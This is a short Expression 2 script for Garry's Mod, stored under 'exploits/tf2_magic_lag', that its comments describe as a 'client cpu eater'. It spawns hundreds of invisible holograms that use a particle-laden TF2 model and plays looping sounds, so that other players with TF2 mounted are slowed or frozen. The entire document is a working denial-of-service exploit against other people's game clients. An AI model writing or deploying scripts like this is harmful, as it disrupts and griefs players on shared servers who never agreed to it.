@name exploits/tf2_magic_lag
@persist SoundsDone HolosSpawned HoloCount CenterCount Sounds:array
@model models/maxofs2d/hover_basic.mdl

# NON-DEFAULT: requires holomodelany enabled
# GAME-CONTENT: requires tf2 mounted 

# by Fasteroid
# client cpu eater
# powered by embedded particles
# only affects clients with TF2 mounted

if( first() ){
    entity():setSkin(3)
    HoloCount = 512
    CenterCount = 32
    for(I=1,32){
        timer("lol"+I,I*100)   
    }
    runOnTick(1)
    Sounds = array(
        "ambient/levels/labs/teleport_malfunctioning.wav",
        "ambient/levels/labs/teleport_active_loop1.wav",
        "ambient/levels/labs/teleport_active_loop1.wav",
        "ambient/levels/labs/machine_ring_resonance_loop1.wav"
    )
}
if(!SoundsDone){
    for(I=1,32){
        if(clk("lol"+I)){
            holoEntity(I):soundPlay(I,0,Sounds[randint(1,Sounds:count()),string])
            if(I==32){
                SoundsDone=1
            }        
        }
    }
}
if(HolosSpawned<HoloCount){
    HolosSpawned++
    holoCreate(HolosSpawned)
    holoPos(HolosSpawned,entity():pos()+randvec()*20*random(0.5,1))
    holoModel(HolosSpawned,"models/items/crystal_ball_pickup_major.mdl")
    holoScale(HolosSpawned,vec())    
    holoParent(HolosSpawned,entity())
    if(HolosSpawned<CenterCount){
        HolosSpawned++
        holoCreate(HolosSpawned)
        holoPos(HolosSpawned,entity():pos()+randvec()*0.5*20)
        holoModel(HolosSpawned,"models/items/crystal_ball_pickup_major.mdl")
        holoScale(HolosSpawned,vec(0))    
        holoParent(HolosSpawned,entity())
    }
}
else{
    runOnTick(0)
}

